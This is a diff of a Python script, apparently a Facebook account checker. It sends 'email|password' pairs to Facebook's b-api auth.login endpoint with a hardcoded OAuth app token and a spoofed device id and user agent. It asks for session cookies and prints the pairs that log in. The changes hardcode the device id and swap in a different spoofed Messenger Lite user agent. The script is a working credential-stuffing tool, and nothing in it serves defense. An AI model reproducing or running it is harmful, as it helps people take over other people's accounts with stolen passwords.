@@ -7,7 +7,6 @@ W = '\033[1;97m'
 
 def selenas(empas):
   url = 'https://b-api.facebook.com/method/auth.login'
-  nganuid = str(uuid.uuid4())
 
   data = {
     'email': empas.split('|')[0],
@@ -15,7 +14,7 @@ def selenas(empas):
     'credentials_type': 'password',
     'error_detail_type': 'button_with_disabled',
     'format': 'json',
-    'device_id': nganuid,
+    'device_id': 'cdc4558c-4dd4-4fd0-9ba6-d09e0223d5e5',
     'generate_session_cookies': 1,
     'generate_analytics_claim': 1,
     'generate_machine_id': 1,
@@ -26,14 +25,11 @@ def selenas(empas):
     'authority': 'b-api.facebook.com',
     'accept-language': 'en-US,en;q=0.9',
     'authorization': 'OAuth 200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; ALE-L21 Build/HuaweiALE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.91 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/181.0.0.12.78;]'
+    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko) [FBAN/MessengerLite;FBAV/115.0.0.2.114;FBPN/com.facebook.mlite;FBLC/ar_EG;FBBV/257412622;FBCR/Orange - STAY SAFE;FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi 7;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1369};]'
     
   }
   
   response = requests.post(url, headers=headers, json=data)
-
-  print(nganuid)
-  
   
   if 'session_key' in response.content.decode('utf-8'):
     print(empas + ' - ' + response.json()['uid'])
